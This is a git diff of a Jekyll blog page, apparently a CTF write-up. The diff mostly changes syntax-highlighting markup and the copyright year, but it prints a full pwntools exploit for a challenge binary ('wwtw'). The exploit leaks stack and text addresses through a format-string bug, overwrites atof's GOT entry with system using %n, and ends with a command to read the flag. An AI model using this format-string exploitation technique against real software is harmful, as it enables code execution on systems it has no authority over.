 <span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Coordinates: "</span><span class="p">)</span>
 <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"choice 3 enabled success"</span><span class="p">)</span>
@@ -646,8 +646,8 @@ Selection:
 
 <span class="n">payload</span> <span class="o">=</span> <span class="n">pass_xy</span>
 
-<span class="c"># constructing format string payload</span>
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">20</span><span class="p">):</span>
+<span class="c1"># constructing format string payload
+</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">20</span><span class="p">):</span>
     <span class="n">a</span> <span class="o">=</span> <span class="s">".</span><span class="si">%</span><span class="s">"</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s">"$p"</span>
     <span class="n">payload</span> <span class="o">+=</span> <span class="n">a</span>
 
@@ -655,23 +655,23 @@ Selection:
 <span class="n">t</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="n">s</span> <span class="o">=</span> <span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Coordinates: "</span><span class="p">)</span>
 <span class="k">print</span> <span class="n">s</span>
-<span class="n">nptr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">"."</span><span class="p">)[</span><span class="mi">13</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="c"># get the stack address</span>
-<span class="n">ret_addr</span> <span class="o">=</span> <span class="n">nptr</span> <span class="o">+</span> <span class="mh">0x406</span> <span class="c"># return address' location</span>
-
+<span class="n">nptr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">"."</span><span class="p">)[</span><span class="mi">13</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="c1"># get the stack address
+</span><span class="n">ret_addr</span> <span class="o">=</span> <span class="n">nptr</span> <span class="o">+</span> <span class="mh">0x406</span> <span class="c1"># return address' location
+</span>
 <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"nptr: "</span><span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">nptr</span><span class="p">))</span>
 <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"ret: "</span><span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">))</span>
 
 <span class="n">payload</span> <span class="o">=</span> <span class="n">pass_xy</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span> <span class="c"># padding</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span> <span class="c1"># padding
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">)</span>
 <span class="n">payload</span> <span class="o">+=</span> <span class="s">".</span><span class="si">%20</span><span class="s">$p"</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="s">".</span><span class="si">%20</span><span class="s">$s."</span> <span class="c"># leak the return address</span>
-<span class="n">t</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">".</span><span class="si">%20</span><span class="s">$s."</span> <span class="c1"># leak the return address
+</span><span class="n">t</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 
 <span class="n">s</span> <span class="o">=</span> <span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Coordinates: "</span><span class="p">)</span>
 <span class="k">print</span> <span class="n">s</span>
-<span class="n">WTF</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">"."</span><span class="p">)[</span><span class="mi">6</span><span class="p">])</span> <span class="c"># return address</span>
-<span class="n">text_base</span> <span class="o">=</span> <span class="n">WTF</span> <span class="o">-</span> <span class="mh">0x1491</span>
+<span class="n">WTF</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">"."</span><span class="p">)[</span><span class="mi">6</span><span class="p">])</span> <span class="c1"># return address
+</span><span class="n">text_base</span> <span class="o">=</span> <span class="n">WTF</span> <span class="o">-</span> <span class="mh">0x1491</span>
 <span class="n">atof_got</span> <span class="o">=</span> <span class="n">text_base</span> <span class="o">+</span> <span class="mh">0x5080</span>
 <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"text_base: "</span><span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">text_base</span><span class="p">))</span>
 <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"atof_got: "</span><span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">atof_got</span><span class="p">))</span>
@@ -680,8 +680,8 @@ Selection:
 <span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span>
 <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">atof_got</span><span class="p">)</span>
 <span class="n">payload</span> <span class="o">+=</span> <span class="s">".</span><span class="si">%20</span><span class="s">$p"</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="s">".</span><span class="si">%20</span><span class="s">$s."</span>  <span class="c"># leak atof's got</span>
-<span class="n">t</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">".</span><span class="si">%20</span><span class="s">$s."</span>  <span class="c1"># leak atof's got
+</span><span class="n">t</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 
 <span class="n">s</span> <span class="o">=</span> <span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Coordinates: "</span><span class="p">)</span>
 <span class="k">print</span> <span class="n">s</span>
@@ -693,8 +693,8 @@ Selection:
 <span class="n">byte1</span> <span class="o">=</span> <span class="n">system_addr</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
 <span class="n">byte2</span> <span class="o">=</span> <span class="p">(</span><span class="n">system_addr</span> <span class="o">&amp;</span> <span class="mh">0xFFFF00</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span>
 
-<span class="c"># use %n to overwrite atof's got entry into system's address</span>
-<span class="n">fmt1</span> <span class="o">=</span> <span class="n">byte1</span> <span class="o">-</span> <span class="mi">28</span>
+<span class="c1"># use %n to overwrite atof's got entry into system's address
+</span><span class="n">fmt1</span> <span class="o">=</span> <span class="n">byte1</span> <span class="o">-</span> <span class="mi">28</span>
 <span class="n">fmt2</span> <span class="o">=</span> <span class="n">byte2</span> <span class="o">-</span> <span class="n">fmt1</span> <span class="o">-</span> <span class="mi">28</span>
 <span class="n">payload</span> <span class="o">=</span> <span class="n">pass_xy</span>
 <span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span>
@@ -707,11 +707,11 @@ Selection:
 <span class="k">print</span> <span class="n">s</span>
 
 <span class="n">t</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-<span class="c"># send cat /home/wwtw/flag;,123 to get flag</span>
-
+<span class="c1"># send cat /home/wwtw/flag;,123 to get flag
+</span>
 </code></pre></div></div>
 
-<p>Flag: <code class="highlighter-rouge">Would you like a Jelly Baby? !@()*ASF)9UW$askjal</code></p>
+<p>Flag: <code class="language-plaintext highlighter-rouge">Would you like a Jelly Baby? !@()*ASF)9UW$askjal</code></p>
 
         
       </section>
@@ -824,7 +824,6 @@ Selection:
       <div class="grid__wrapper">
         
           
-          
 
 
 
@@ -844,7 +843,6 @@ Selection:
 
         
           
-          
 
 
 
@@ -863,7 +861,6 @@ Selection:
 </div>
 
         
-          
           
 
 
@@ -886,7 +883,6 @@ Selection:
 
         
           
-          
 
 
 
@@ -907,6 +903,7 @@ Selection:
         
       </div>
     </div>
+  
   
 </div>
 
@@ -957,7 +954,7 @@ Selection:
   </ul>
 </div>
 
-<div class="page__footer-copyright">&copy; 2019 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+<div class="page__footer-copyright">&copy; 2020 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
 
       </footer>
     </div>
